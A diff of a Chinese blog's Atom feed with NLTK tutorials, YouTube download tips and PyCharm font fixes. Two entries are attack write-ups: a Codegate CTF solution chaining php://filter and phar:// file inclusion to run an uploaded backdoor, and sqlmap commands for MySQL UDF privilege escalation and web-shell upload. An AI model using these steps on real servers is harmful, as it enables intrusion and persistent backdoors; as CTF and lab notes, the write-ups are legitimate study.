@@ -4,7 +4,7 @@
   <title><![CDATA[Ourren]]></title>
   <link href="http://test.ourren.com/atom.xml" rel="self"/>
   <link href="http://test.ourren.com/"/>
-  <updated>2015-03-17T14:34:06-07:00</updated>
+  <updated>2015-03-17T15:10:33-07:00</updated>
   <id>http://test.ourren.com/</id>
   <author>
     <name><![CDATA[ourren]]></name>
@@ -15,25 +15,23 @@
   
   <entry>
     <title type="html"><![CDATA[Phpar突破文件包含]]></title>
-    <link href="http://test.ourren.com/2015/03/16/phpar%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <link href="http://test.ourren.com/2015/03/16/phpar%20include%20exploit/"/>
     <updated>2015-03-16T00:00:00-07:00</updated>
-    <id>http://test.ourren.com/2015/03/16/phpar突破文件包含</id>
+    <id>http://test.ourren.com/2015/03/16/phpar include exploit</id>
     <content type="html"><![CDATA[<p>Codegate CTF中owlur的一点解题技巧，通过测试发现网站有文件包含可以通过<a href="http://php.net/manual/zh/wrappers.php.php">php://filter</a>读取页面源文件，对php://filter不熟悉的可以研究下：</p>
 
 <pre><code>http://x/owlur/index.php?page=php://filter/convert.base64-encode/resource=upload
 http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
 </code></pre>
 
-
 <p>其中读取后的内容是经过编码了的，要看源码记得解码，比如rot13可以在Linux下：</p>
 
 <pre><code>cat 1.php | rot13
 </code></pre>
 
+<p>而通过源码发现网站存在文件包含漏洞，源文件代码如下：<!--more--></p>
 
-<p>而通过源码发现网站存在文件包含漏洞，源文件代码如下：</p>
-
-<pre><code><?php
+<pre><code>&lt;?php
 $p = $_REQUEST['page'];
 
 if($p == "" || $p == "index")
@@ -45,59 +43,57 @@ $haq = base64_decode("ICAgICAgICAgICAgICAgICAgIC8tLS0tLS0tLS0KICAgICAgICAgICAgIC
 $haq = htmlentities($haq);
 
 if(strstr($p,"..") !== FALSE)
-die("<pre>$haq</pre>&#8221;);
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
 
-if(stristr($p,&#8221;http&#8221;) !== FALSE)
-die(&#8221;<pre>$haq</pre>&#8221;);
+if(stristr($p,"http") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
 
-if(stristr($p,&#8221;ftp&#8221;) !== FALSE)
-die(&#8221;<pre>$haq</pre>&#8221;);
+if(stristr($p,"ftp") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
 
-if(strlen($p) >= 60)
-die(&#8221;<pre>string > 60
-$haq</pre>&#8221;);
+if(strlen($p) &gt;= 60)
+die("&lt;pre&gt;string &gt; 60
+$haq&lt;/pre&gt;");
 
-$inc = sprintf(&#8220;%s.php&#8221;,$p);
+$inc = sprintf("%s.php",$p);
 
-?>
-<?php
+?&gt;
+&lt;?php
 include($inc);
-?>
+?&gt;
 </code></pre>
-
 
 <p>可以发现其实page参数可以控制，然后会在后面加一个包含的文件名后面加一个“.php”进行文件包含。</p>
 
 <p>另外而此程序可以上传图片，而上传时只能上传jpg图片，其实程序只检测了后缀是不是jpg结尾的，同时在另存为时程序会自动重命名：随机字符串*6.jpg，也就是说：</p>
 
-<pre><code>xxxx.jpg ---->randon.jpg
+<pre><code>xxxx.jpg ----&gt;randon.jpg
 </code></pre>
-
 
 <p>其实他没有检测该上传文件是否合法，所以原始文件可以上传上去的，只不过后缀给改为.jpg了。因此我们可以上传我们需要的文件，但是怎么进行包含，这个确实很考脑力：</p>
 
 <ul>
-    <li>上传的文件不能直接包含，因为直接包含上传文件会变为：xxx.jpg.php，不能解析，并且传递的长度超过60；</li>
-    <li>不存在截断，因为php版本为：5.5.x；</li>
-    <li>远程包含过滤了http,ftp，因此只能考虑其他协议，大家可能首先会想到data://， php://input,很可惜全部失效；</li>
+<li>上传的文件不能直接包含，因为直接包含上传文件会变为：xxx.jpg.php，不能解析，并且传递的长度超过60；</li>
+<li>不存在截断，因为php版本为：5.5.x；</li>
+<li>远程包含过滤了http,ftp，因此只能考虑其他协议，大家可能首先会想到data://， php://input,很可惜全部失效；</li>
 </ul>
 
 
 <p>查询PHP手册发现PHP支持如下的<a href="http://php.net/manual/en/wrappers.php">Wrappers</a>：</p>
 
 <ul>
-    <li>file:// — Accessing local filesystem</li>
-    <li>http:// — Accessing HTTP(s) URLs</li>
-    <li>ftp:// — Accessing FTP(s) URLs</li>
-    <li>php:// — Accessing various I/O streams</li>
-    <li>zlib:// — Compression Streams</li>
-    <li>data:// — Data (RFC 2397)</li>
-    <li>glob:// — Find pathnames matching pattern</li>
-    <li>phar:// — PHP Archive</li>
-    <li>ssh2:// — Secure Shell 2</li>
-    <li>rar:// — RAR</li>
-    <li>ogg:// — Audio streams</li>
-    <li>expect:// — Process Interaction Streams</li>
+<li>file:// — Accessing local filesystem</li>
+<li><a href="http://">http://</a> — Accessing HTTP(s) URLs</li>
+<li><a href="ftp://">ftp://</a> — Accessing FTP(s) URLs</li>
+<li>php:// — Accessing various I/O streams</li>
+<li>zlib:// — Compression Streams</li>
+<li>data:// — Data (RFC 2397)</li>
+<li>glob:// — Find pathnames matching pattern</li>
+<li>phar:// — PHP Archive</li>
+<li>ssh2:// — Secure Shell 2</li>
+<li>rar:// — RAR</li>
+<li>ogg:// — Audio streams</li>
+<li>expect:// — Process Interaction Streams</li>
 </ul>
 
 
@@ -107,13 +103,12 @@ include($inc);
 
 <p>果断下载一个backdoor，然后压缩为zip，然后修改后缀为.jpg，上传成功并得到目标文件地址，整个过程可以这样子描述：</p>
 
-<pre><code>phpspy.php->x.php->x.zip->x.jpg->upload->xsssa.jpg
+<pre><code>phpspy.php-&gt;x.php-&gt;x.zip-&gt;x.jpg-&gt;upload-&gt;xsssa.jpg
 </code></pre>
-
 
 <p>于是构造路径并通过phar://进行访问，你猜怎么着，居然成功了，顺利得到flag：</p>
 
-<p><a href="http://x/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1">http://x/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1</a></p>
+<p><a href="http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1">http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1</a></p>
 
 <p>其中O6i51MF.jpg是一个zip文件，里面有一个1.php的后门。后来听说zip://这样子也可以，so?</p>
 ]]></content>
@@ -121,15 +116,17 @@ include($inc);
   
   <entry>
     <title type="html"><![CDATA[NLTK笔记:词干提取与词性标注]]></title>
-    <link href="http://test.ourren.com/2015/03/12/nltk%E7%AC%94%E8%AE%B0%E8%AF%8D%E5%B9%B2%E6%8F%90%E5%8F%96%E4%B8%8E%E8%AF%8D%E6%80%A7%E6%A0%87%E6%B3%A8/"/>
+    <link href="http://test.ourren.com/2015/03/12/nltk%20note%20stem%20pos_tag/"/>
     <updated>2015-03-12T00:00:00-07:00</updated>
-    <id>http://test.ourren.com/2015/03/12/nltk笔记词干提取与词性标注</id>
+    <id>http://test.ourren.com/2015/03/12/nltk note stem pos_tag</id>
     <content type="html"><![CDATA[<p>前面虽然对<a href="http://blog.ourren.com/?p=89331">nltk分句和分词</a>进行了分析和实现，但是在进一步进行处理之前，我们需要对这些词语进行规范化处理，例如我们需要统一所有单词的大小写，词语时态问题「相同的单词在不同的时态句型中属于不同的单词，我们需要转换为同一单词」等。nltk则针对问题提供了相关的类库，主要有两类操作：词干提取，词性标注。</p>
 
-<h3 id="toc_1">词干提取</h3>
-
+<h3>词干提取</h3>
 
 <p>词干提取主要是将不同时态的词语转变为单词一般时态，例如seeing->see，extremely->extem，目前提供的类库在一定程度上可以实现这类转换「有些词语暂时不行，主要有些模块是基于字典的」。</p>
+
+<!--more-->
+
 
 <p>nltk提供三种方法可以实现如上功能：Porter、Lancaster、WordNet。使用都相当简单，具体使用方法如下：</p>
 
@@ -138,7 +135,7 @@ include($inc);
 
 """
 Copyright (c) 2014-2015 ourren
-author: ourren <i@ourren.com>
+author: ourren &lt;i@ourren.com&gt;
 """
 import nltk
 
@@ -169,9 +166,7 @@ if __name__ == "__main__":
     main()
 </code></pre>
 
-
-<h3 id="toc_2">词性标注</h3>
-
+<h3>词性标注</h3>
 
 <p><a href="http://baike.baidu.com/view/377635.htm">词性</a>指作为划分词类的根据的词的特点。现代汉语的词可以分为两类12种词性。一类是实词：名词、动词、形容词、数词、量词和代词。一类是虚词：副词、介词、连词、助词、拟声词和叹词。因此nltk对应的pos_tag模块也是实现这类功能，将一个句子中的词性进行标注；</p>
 
@@ -198,7 +193,6 @@ VN      past participle given, taken, begun, sung
 WH      wh determiner   who, which, when, what, where, how
 </code></pre>
 
-
 <p>下面看具体例如：</p>
 
 <pre><code>def sentence_pos(sentences):
@@ -207,67 +201,63 @@ WH      wh determiner   who, which, when, what, where, how
         print words
 </code></pre>
 
-
 <p>完整代码可以见<a href="https://github.com/ourren/learn_nltk">learn_nltk</a>。</p>
 ]]></content>
   </entry>
   
   <entry>
     <title type="html"><![CDATA[Linux下MySQL Udf 提权]]></title>
-    <link href="http://test.ourren.com/2015/03/10/linux%E4%B8%8Bmysql-udf-%E6%8F%90%E6%9D%83/"/>
+    <link href="http://test.ourren.com/2015/03/10/linux%20mysql%20udf%20shell/"/>
     <updated>2015-03-10T00:00:00-07:00</updated>
-    <id>http://test.ourren.com/2015/03/10/linux下mysql-udf-提权</id>
+    <id>http://test.ourren.com/2015/03/10/linux mysql udf shell</id>
     <content type="html"><![CDATA[<p>前几天做一个小竞赛中有一个题目：给定的测试环境登录页面有POST注入漏洞，于是果断操起sqlmap跑数据，无意中发现当前MySQL连接用户为root，于是想到udf提权「虽然Windows下MySQL提权基本上没问题，但是Linux环境下原来一直没成功过。」，最终成功获取root权限「主要问题在于MySQL是以root权限运行」，记录笔记如下，方便以后查阅：</p>
 
-<h3 id="toc_1">具体步骤如下</h3>
-
+<h3>具体步骤如下</h3>
 
 <ol>
-    <li>找到MySQL插件目录:
-<pre><code>python sqlmap.py -u 'http://xxxx' --sql-shell
+<li><p>找到MySQL插件目录:</p>
 
-show variables like "%plugin%";
-</code></pre>
-</li>
-    <li>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib<em>mysqludf</em>sys</a>到MySQL插件目录;
-<pre><code>python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys 
---file-dest=/usr/lib/mysql/plugin/
-</code></pre>
-</li>
-    <li>激活存储过程「sys_exec」函数:
-<pre><code>python sqlmap.py -u 'http://xxxx' --sql-shell
+<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
 
-CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+ show variables like "%plugin%";
+</code></pre></li>
+<li><p>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib_mysqludf_sys</a>到MySQL插件目录;</p>
 
-SELECT * FROM information_schema.routines
+<pre><code> python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys.so 
+ --file-dest=/usr/lib/mysql/plugin/
+</code></pre></li>
+<li><p>激活存储过程「sys_exec」函数:</p>
 
-sys_exec(id);
-</code></pre>
-</li>
-    <li>也利用sqlmap上传后门程序：
-<pre><code>python sqlmap.py -u 'http://xxx'  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php
-</code></pre>
-</li>
+<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
+
+ CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+
+ SELECT * FROM information_schema.routines
+
+ sys_exec(id);
+</code></pre></li>
+<li><p>也利用sqlmap上传后门程序：</p>
+
+<pre><code> python sqlmap.py -u 'http://xxx'  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php
+</code></pre></li>
 </ol>
 
 
-<h3 id="toc_2">测试环境</h3>
-
+<h3>测试环境</h3>
 
 <ul>
-    <li>Linux Ubuntu 11.04 (Natty Narwhal)</li>
-    <li>PHP 5.3.5, Apache 2.2.17</li>
-    <li>MySQL 5.0</li>
+<li>Linux Ubuntu 11.04 (Natty Narwhal)</li>
+<li>PHP 5.3.5, Apache 2.2.17</li>
+<li>MySQL 5.0</li>
 </ul>
 
 
-<h3 id="toc_3">参考资料</h3>
-
+<h3>参考资料</h3>
 
 <ol>
-    <li>http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html</li>
-    <li>https://github.com/mysqludf/lib<em>mysqludf</em>sys</li>
-    <li>https://code.google.com/p/mysql-udf-http/</li>
+<li><a href="http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html">http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html</a></li>
+<li><a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></li>
+<li><a href="https://code.google.com/p/mysql-udf-http/">https://code.google.com/p/mysql-udf-http/</a></li>
 </ol>
 
 ]]></content>
@@ -275,26 +265,20 @@ sys_exec(id);
   
   <entry>
     <title type="html"><![CDATA[NLTK笔记:分句与分词]]></title>
-    <link href="http://test.ourren.com/2015/02/21/nltk%E7%AC%94%E8%AE%B0%E5%88%86%E5%8F%A5%E4%B8%8E%E5%88%86%E8%AF%8D/"/>
+    <link href="http://test.ourren.com/2015/02/21/nltk%20note%20token%20sentence/"/>
     <updated>2015-02-21T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/02/21/nltk笔记分句与分词</id>
-    <content type="html"><![CDATA[<h3 id="toc_0">NLTK笔记:分句与分词</h3>
+    <id>http://test.ourren.com/2015/02/21/nltk note token sentence</id>
+    <content type="html"><![CDATA[<p>NLTK在数据抓取完成后，你拿到的数据往往是一篇文章或者一大段文字，在进行其他处理之前，你需要先对文章进行切割或者处理(去除多余字符、特殊符号，分句和分词)，分句主要是可以把有些不需要的句子给去掉，比如长度小于10的。</p>
 
+<h4>分句</h4>
 
-<p>NLTK在数据抓取完成后，你拿到的数据往往是一篇文章或者一大段文字，在进行其他处理之前，你需要先对文章进行切割或者处理(去除多余字符、特殊符号，分句和分词)，分句主要是可以把有些不需要的句子给去掉，比如长度小于10的。</p>
+<p>分句在nltk中没有提供相关的库来实现，但是我们可以通过python的split等函数快速完成切分任务，主要的分割特征如下：
++ 中文主要有(。？！)这几个句子结尾标志；
++ 英文也差不多(. ? !)；
+使用split函数进行分割，可以得到新的列表，例如下面的函数;</p>
 
-<h4 id="toc_1">分句</h4>
+<!--more-->
 
-
-<p>一般情况下我们可以通过python的split等函数快速完成切分任务，主要的分割特征如下：</p>
-
-<ul>
-    <li>中文主要有(。？！)这几个句子结尾标志；</li>
-    <li>英文也差不多(. ? !)；</li>
-</ul>
-
-
-<p>可以使用split函数进行分割，可以得到新的列表，例如下面的函数;</p>
 
 <pre><code>def sentence_split(str_centence):
     list_ret = list()
@@ -308,26 +292,13 @@ sys_exec(id);
     return list_ret
 </code></pre>
 
-
-<p>另外nltk中也有提供sent_tokenize库来实现分句，具体使用情况如下函数所示：</p>
-
-<pre><code> from nltk.tokenize import sent_tokenize
- def sentence_token_nltk(str):
-    sent_tokenize_list = sent_tokenize(str)
-    return sent_tokenize_list
-</code></pre>
-
-
-<p>其实从输出结果来看，nltk提供的分句功能明显优于我们自定义函数。</p>
-
-<h4 id="toc_2">分词</h4>
-
+<h4>分词</h4>
 
 <p>分词在NLP处理中运用得最多，但是目前针对英文分词基本上已经成熟，而针对中文的分词技术还在不断发展，对于pythoner而言，主要可以采取如下的分词方法对句子或者段落进行分词：</p>
 
 <ul>
-    <li>中文：采用<a href="https://github.com/fxsjy/jieba">jieba</a>进行分词，然后再可以通过NLTK进行词频统计分析，整体而言jieba对中文分词还是可以接受；</li>
-    <li>英文：可以直接使用NLTK中nltk.tokenize模块进行分词；</li>
+<li>中文：采用<a href="https://github.com/fxsjy/jieba">jieba</a>进行分词，然后再可以通过NLTK进行词频统计分析，整体而言jieba对中文分词还是可以接受；</li>
+<li>英文：可以直接使用NLTK中nltk.tokenize模块进行分词；</li>
 </ul>
 
 
@@ -344,88 +315,71 @@ if __name__ == '__main__':
     main()
 </code></pre>
 
-
-<h4 id="toc_3">特殊字符</h4>
-
+<h4>特殊字符</h4>
 
 <p>在处理分词或者分句中经常会除去一些特殊符号或者特殊单词，一般可能会用到的python函数：</p>
 
 <ul>
-    <li>startswith</li>
-    <li>endswith</li>
-    <li>contains</li>
-    <li>replace</li>
-    <li>split</li>
-    <li>len</li>
+<li>startswith</li>
+<li>endswith</li>
+<li>contains</li>
+<li>replace</li>
+<li>split</li>
+<li>len</li>
 </ul>
 
-
-<h4 id="toc_4">代码地址</h4>
-
-
-<p>本系列文章的代码托管在github上面<a href="https://github.com/ourren/learn_nltk">learn_nltk</a>;</p>
 ]]></content>
   </entry>
   
   <entry>
     <title type="html"><![CDATA[YouTube视频下载方法汇总]]></title>
-    <link href="http://test.ourren.com/2015/02/20/youtube%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/"/>
+    <link href="http://test.ourren.com/2015/02/20/youtube%20video%20download%20summary/"/>
     <updated>2015-02-20T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/02/20/youtube视频下载方法汇总</id>
+    <id>http://test.ourren.com/2015/02/20/youtube video download summary</id>
     <content type="html"><![CDATA[<p>最近一直有人问我YouTube的视频怎么下载，其实在V2EX上也有很多用户讨论这个问题。本文就将这些方法汇总，方便大家查询和参考。</p>
 
 <p>在介绍下载方法之前，首先大家需要明白的是本文针对的是YouTube上的视频，也就是说原始地址都必须是YouTube的视频链接。如果你需要下载的视频在其它网站上，那么你需要判断是否为YouTube视频并且需要找到YouTube的原始链接，其实链接也非常好找，点击播放器右下角的「YouTube」就可以打开YouTube的原始链接，有了这个原始链接就可以采用如下两种方法下载：</p>
 
-<h4 id="toc_1">使用下载网站</h4>
-
+<h4>使用下载网站</h4>
 
 <p>「推荐」这种方法简单快捷，懒人必备，整个过程只需要点击几次：</p>
 
 <ul>
-    <li>打开<a href="http://www.clipconverter.cc/">http://www.clipconverter.cc/</a>;</li>
-    <li>复制需要下载的原始链接到上面网页的输入框选择「continue」;</li>
-    <li>选择分辨率，一般果断选1080p;</li>
-    <li>点击「start」;</li>
-    <li>「download」</li>
+<li>打开<a href="http://www.clipconverter.cc/">http://www.clipconverter.cc/</a>;</li>
+<li>复制需要下载的原始链接到上面网页的输入框选择「continue」;</li>
+<li>选择分辨率，一般果断选1080p;</li>
+<li>点击「start」;</li>
+<li>「download」</li>
 </ul>
 
 
 <p>跟clipconverter类似的网站很多，列举如下：</p>
 
 <ul>
-    <li>
-<a href="http://en.savefrom.net/">http://en.savefrom.net/</a>;</li>
-    <li>
-<a href="https://d.jaylab.org/">https://d.jaylab.org/</a>;</li>
-    <li>
-<a href="http://kej.tw/flvretriever/">http://kej.tw/flvretriever/</a>;</li>
-    <li>
-<a href="http://keepvid.com/">http://keepvid.com/</a>;</li>
+<li><a href="http://en.savefrom.net/">http://en.savefrom.net/</a>;</li>
+<li><a href="https://d.jaylab.org/">https://d.jaylab.org/</a>;</li>
+<li><a href="http://kej.tw/flvretriever/">http://kej.tw/flvretriever/</a>;</li>
+<li><a href="http://keepvid.com/">http://keepvid.com/</a>;</li>
 </ul>
 
 
-<h4 id="toc_2">使用下载工具</h4>
-
+<h4>使用下载工具</h4>
 
 <p>Windows/Linux/Mac上都有对应的下载工具，同时Firefox也有类似的插件可以下载视频；</p>
 
 <ul>
-    <li>
-<a href="https://www.4kdownload.com/">4kdownload</a>支持多平台;</li>
-    <li>
-<a href="http://rg3.github.io/youtube-dl/">youtube-dl </a>，支持多平台；</li>
-    <li>Firefox + video downloadhelper;</li>
+<li><a href="https://www.4kdownload.com/">4kdownload</a>支持多平台;</li>
+<li><a href="http://rg3.github.io/youtube-dl/">youtube-dl   </a>，支持多平台；</li>
+<li>Firefox + video downloadhelper;</li>
 </ul>
 
 
-<h4 id="toc_3">国内视频下载</h4>
-
+<h4>国内视频下载</h4>
 
 <p>最后补充下国内视频「youku、tudou、ku6」等网站可以采用硕鼠进行下载：</p>
 
 <ul>
-    <li>
-<a href="http://www.flvcd.com/">硕鼠</a>，同样的使用方法，复制链接即可下载;</li>
+<li><a href="http://www.flvcd.com/">硕鼠</a>，同样的使用方法，复制链接即可下载;</li>
 </ul>
 
 ]]></content>
@@ -433,44 +387,45 @@ if __name__ == '__main__':
   
   <entry>
     <title type="html"><![CDATA[NLTK笔记:简介与环境搭建]]></title>
-    <link href="http://test.ourren.com/2015/02/05/nltk%E7%AE%80%E4%BB%8B%E4%B8%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
+    <link href="http://test.ourren.com/2015/02/05/nltk%20note%20environment%20install/"/>
     <updated>2015-02-05T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/02/05/nltk简介与环境搭建</id>
-    <content type="html"><![CDATA[<h3 id="toc_1">NLP与NLTK</h3>
-
+    <id>http://test.ourren.com/2015/02/05/nltk note environment install</id>
+    <content type="html"><![CDATA[<h3>NLP与NLTK</h3>
 
 <p>在详细介绍nltk之前，我感觉有必要区分下NLP与NLTK的关系:</p>
 
 <p>NLP是指自然语言处理，英文(Natural Language Processing)，该技术主要解决计算机自动识别和处理人类语言，如何让计算机能够理解我们的语言，从而减少人类的工作量。个人认为其应用场景有如下几点：</p>
 
 <ol>
-    <li>个性推荐，需要计算两类物品的相识度和相关度；</li>
-    <li>情感分析，用户对商品的评价，网民对帖子或者文章的态度；</li>
-    <li>关键字提取，对网络商品的标题提取并分类，自动摘要；</li>
-    <li>其它，待补充；</li>
+<li>个性推荐，需要计算两类物品的相识度和相关度；</li>
+<li>情感分析，用户对商品的评价，网民对帖子或者文章的态度；</li>
+<li>关键字提取，对网络商品的标题提取并分类，自动摘要；</li>
+<li>其它，待补充；</li>
 </ol>
 
 
 <p>并且该相关技术最近几年热度非常高，计算机行业内研究的人也越来越多，但是不同语言的处理差异很大，比如英文的各种语言处理库基本上已经成熟，而中文的语言处理则发展缓慢；</p>
 
+<!--more-->
+
+
 <p>而NLTK是斯坦福大学开发的处理自然语言的python库，(斯坦福大学自然语言处理组是世界知名的NLP研究小组，目前course上他们的课程暂时还没看开放)，因此我们可以借助NLTK库的一些功能来处理各种事情。事实上NLTK提供的功能相当全，主要包含如下功能：</p>
 
 <ol>
-    <li>语料库：提供了经典书籍，词典，演讲，网络语言，论坛等各种语料库；</li>
-    <li>断句与分词：可以方便地对文章，段落进行分词；</li>
-    <li>词频统计：计算句子或者文章中每个单词的频率；</li>
-    <li>同义词与词态：单词的同义词「WordNet」和单词词态「过去式，进行时等」的还原；</li>
-    <li>词性的标注：动词，名词，形容词和副词等的标注；</li>
-    <li>分类算法：例如常见的信息熵，朴素贝叶斯算法，最大信息熵模型等；</li>
-    <li>情感分析：当然这个其实是利用语料库和分类算法的一种应用场景；</li>
-    <li>其它:待补充；</li>
+<li>语料库：提供了经典书籍，词典，演讲，网络语言，论坛等各种语料库；</li>
+<li>断句与分词：可以方便地对文章，段落进行分词；</li>
+<li>词频统计：计算句子或者文章中每个单词的频率；</li>
+<li>同义词与词态：单词的同义词「WordNet」和单词词态「过去式，进行时等」的还原；</li>
+<li>词性的标注：动词，名词，形容词和副词等的标注；</li>
+<li>分类算法：例如常见的信息熵，朴素贝叶斯算法，最大信息熵模型等；</li>
+<li>情感分析：当然这个其实是利用语料库和分类算法的一种应用场景；</li>
+<li>其它:待补充；</li>
 </ol>
 
 
 <p>说了这么多，NLTK其实主要是针对英语进行处理，对中文支持不行，其它博客也有<a href="http://www.52nlp.cn/python%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E5%AE%9E%E8%B7%B5-%E5%9C%A8nltk%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E5%99%A8">改造NLTK支持中文的博文</a>，NLP和NLTK的简介基本上就扯这么多。</p>
 
-<h3 id="toc_2">环境搭建</h3>
-
+<h3>环境搭建</h3>
 
 <p>NLTK的安装步骤非常简单，具体参照<a href="http://www.nltk.org/install.html">官网</a>：</p>
 
@@ -482,13 +437,11 @@ Install NLTK: run sudo pip install -U nltk
 Test installation: run python then type import nltk
 </code></pre>
 
-
 <p>需要注意的是上面只安装了nltk的主库，语料库这些都没有安装，可以通过如下的命令安装语料库，当然这些语料库也可以在需要的时候再进行安装，在python命令行中运行如下命令：</p>
 
 <pre><code>import nltk  
 nltk.download()  
 </code></pre>
-
 
 <p>然后会弹出下载对话框，需要你选择语料库进行下载。在这里补充说明下什么是语料库：所谓语料库就是别人或者官方收集的测试数据，而这些数据一般已经进行了特殊处理，方便你在处理各种数据的时候可以参照这些语料库进行分析，当然你也可以加入自己的语料库。</p>
 ]]></content>
@@ -496,35 +449,37 @@ nltk.download()
   
   <entry>
     <title type="html"><![CDATA[NLTK笔记:系列文章概述]]></title>
-    <link href="http://test.ourren.com/2015/02/02/nltk%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E6%A6%82%E8%BF%B0/"/>
+    <link href="http://test.ourren.com/2015/02/02/nltk%20note%20content%20list/"/>
     <updated>2015-02-02T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/02/02/nltk系列文章概述</id>
+    <id>http://test.ourren.com/2015/02/02/nltk note content list</id>
     <content type="html"><![CDATA[<p>从本系列文章中，我将最近学习自然语言处理中的NLTK库的相关技术进行分享，帮助初学者熟悉NLTK库的相关模块和功能，希望能够让你轻松地操作相关模块，完成自己的需求任务。</p>
 
-<h3 id="toc_0">文章目录</h3>
-
+<h3>文章目录</h3>
 
 <p>系列文章首先会介绍NLTK的相关概念，然后介绍NLTK中比较常用的几个模块，争取每个篇文章都配上实例代码，最后用一个完整的实例进行讲解，目前暂定的目录如下：</p>
 
+<!-- more -->
+
+
 <ol>
-    <li>NLTK简介与环境搭建；</li>
-    <li>NLTK之分句；</li>
-    <li>NLTK之分词；</li>
-    <li>NLTK之句子分析；</li>
-    <li>NLTK之词性分析；</li>
-    <li>NLTK之词态分析；</li>
-    <li>NLTK之感情分析；</li>
-    <li>NLTK之关键字提取；</li>
-    <li>NLTK之分类算法；</li>
-    <li>&#8230;&#8230;</li>
+<li>NLTK相关概念与环境搭建；</li>
+<li>NLTK之分句；</li>
+<li>NLTK之分词；</li>
+<li>NLTK之句子分析；</li>
+<li>NLTK之词性分析；</li>
+<li>NLTK之词态分析；</li>
+<li>NLTK之感情分析；</li>
+<li>NLTK之关键字提取；</li>
+<li>NLTK之分类算法；</li>
+<li>&hellip;&hellip;</li>
 </ol>
 
 
 <p>暂时只考虑到以上的几个部分，以后有特别需要的部分再继续补上，其中本系列文章的技术主要参考两本书籍：</p>
 
 <ol>
-    <li><a href="http://www.nltk.org/book/">Natural Language Processing With Python</a></li>
-    <li><a href="http://vdisk.weibo.com/s/qdxg3WEhv6A2">Machine Learning for Hackers</a></li>
+<li><a href="http://www.nltk.org/book/">Natural Language Processing With Python</a></li>
+<li><a href="http://vdisk.weibo.com/s/qdxg3WEhv6A2">Machine Learning for Hackers</a></li>
 </ol>
 
 ]]></content>
@@ -532,44 +487,46 @@ nltk.download()
   
   <entry>
     <title type="html"><![CDATA[美化Ubuntu下Pycharm字体]]></title>
-    <link href="http://test.ourren.com/2015/01/31/%E7%BE%8E%E5%8C%96ubuntu%E4%B8%8Bpycharm%E7%9A%84%E5%AD%97%E4%BD%93/"/>
+    <link href="http://test.ourren.com/2015/01/31/ubuntu%20beauty%20pycharm%20fonts/"/>
     <updated>2015-01-31T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/01/31/美化ubuntu下pycharm的字体</id>
-    <content type="html"><![CDATA[<p>Pycharm作为一款优秀的Python IDE，现在更有免费的社区版可供下载，不得不说对于pyer方便不少，随便Sublime Text确实可以在一定程度上解决问题，但是Pycharm的调试和集成工具绝对是提交效率的好帮手。然而Pycharm安装在Ubuntu下时界面和字体的显示效果极差，跟Mac的效果简直没办法比，因此Google了一番找到了完美的解决方案，特此分享。</p>
+    <id>http://test.ourren.com/2015/01/31/ubuntu beauty pycharm fonts</id>
+    <content type="html"><![CDATA[<h3>美化Ubuntu下pycharm的字体</h3>
 
-<h3 id="toc_1">解决方案</h3>
+<p>Pycharm作为一款优秀的Python IDE，现在更有免费的社区版可供下载，不得不说对于pyer方便不少，随便Sublime Text确实可以在一定程度上解决问题，但是Pycharm的调试和集成工具绝对是提交效率的好帮手。然而Pycharm安装在Ubuntu下时界面和字体的显示效果极差，跟Mac的效果简直没办法比，因此Google了一番找到了完美的解决方案，特此分享。</p>
 
+<h3>解决方案</h3>
 
 <p>Pycharm 字体渲染技术差的原因貌似主要是openjdk的问题，因此Linux下通过infinality fontconfig和openjdk patch来解决相关问题，在国外博客和V2ex上其实已经有详细说明：</p>
 
+<!--more-->
+
+
 <ol>
-    <li>
-<a href="http://www.webupd8.org/2013/06/install-openjdk-patched-with-font-fixes.html">INSTALL OPENJDK PATCHED WITH FONT FIXES</a>；</li>
-    <li><a href="http://www.webupd8.org/2013/06/better-font-rendering-in-linux-with.html">BETTER FONT RENDERING IN LINUX WITH INFINALITY</a></li>
-    <li><a href="http://www.v2ex.com/t/88662">Linux中PyCharm渲染字体</a></li>
+<li><a href="http://www.webupd8.org/2013/06/install-openjdk-patched-with-font-fixes.html">INSTALL OPENJDK PATCHED WITH FONT FIXES</a>；</li>
